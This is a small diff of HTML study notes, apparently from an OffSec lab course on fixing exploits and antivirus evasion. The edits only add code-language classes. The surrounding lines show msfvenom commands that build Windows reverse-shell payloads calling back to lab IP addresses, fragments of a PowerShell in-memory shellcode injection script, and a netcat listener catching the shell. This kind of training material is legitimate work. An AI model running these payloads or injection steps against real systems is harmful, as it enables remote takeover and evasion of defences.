@@ -251,7 +251,7 @@
 </ul>
 </li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f exe &gt; binary.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -436,7 +436,7 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 <li>We have to add a payload and will use the same one as the PE for consistency.</li>
 <li>Generate with msfvenom.</li>
 </ul>
-<pre><code>kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+<pre><code class="language-bash">kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
 ...
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -527,7 +527,7 @@ $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 </ul>
 </li>
 </ul>
-<pre><code>PS C:\Users\offsec\Desktop&gt; .\meminj.ps1
+<pre><code class="language-powershell">PS C:\Users\offsec\Desktop&gt; .\meminj.ps1
 .\meminj.ps1 : File C:\Users\offsec\Desktop\meminj.ps1 cannot be loaded because running scripts is disabled on this
 system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
 At line:1 char:1
@@ -551,7 +551,7 @@ Unrestricted
 <li>Now we start a local netcat listener and run our scipts.</li>
 <li>The script executes and we receive a reverse shell.</li>
 </ul>
-<pre><code>┌──(operator㉿labhost)-[~/OffSec/av-evasion]
+<pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/av-evasion]
 └─$ nc -nvlp 443            
 listening on [any] 443 ...
 connect to [192.168.45.239] from (UNKNOWN) [192.168.219.62] 52269
